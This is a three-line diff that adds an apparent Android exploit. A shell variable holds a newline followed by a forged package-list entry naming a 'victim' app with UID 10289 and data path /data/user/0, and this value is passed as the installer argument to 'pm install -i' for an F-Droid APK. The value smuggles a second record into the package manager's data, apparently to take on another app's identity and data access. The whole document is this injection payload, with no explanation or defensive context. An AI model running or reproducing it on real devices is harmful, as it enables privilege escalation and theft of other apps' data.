@@ -1,0 +1,3 @@
+PAYLOAD="@null
+victim 10289 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
+pm install -i "$PAYLOAD" /data/local/tmp/F-Droid.apk
